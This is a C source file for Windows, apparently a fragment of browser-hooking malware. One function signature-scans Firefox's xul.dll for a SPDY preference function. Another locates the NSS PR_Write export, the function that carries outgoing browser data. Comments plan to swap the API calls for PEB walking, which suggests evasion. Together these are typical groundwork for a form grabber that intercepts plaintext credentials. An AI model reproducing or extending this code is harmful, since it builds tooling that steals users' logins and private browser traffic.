#include <Windows.h>
#include "PE Tools.h"
#include "Firefox Signatures.h"
#include "Memory Tools.h"

DWORD FindPrefFunction()
{
	HMODULE hModule = GetModuleHandleW(L"xul.dll"); //peb replace todo
	DWORD dwAddress = 0;
	if (hModule)
	{
		DWORD dwModule = GetModuleSize(hModule);
		if (dwModule)
		{
			dwAddress = FindMemory((unsigned char*)FirefoxSPDY, (DWORD)hModule, dwModule, sizeof(FirefoxSPDY));
		}
	}
	return dwAddress;
}

DWORD FindPRWrite()
{
	HMODULE hModule = (HMODULE)GetModuleBase32(L"nss3.dll"); //peb replace todo
	DWORD dwAddress = 0;
	if (hModule)
	{
		dwAddress = (DWORD)GetProcAddress32(hModule, "PR_Write"); //exports todo
	}
	return dwAddress;
}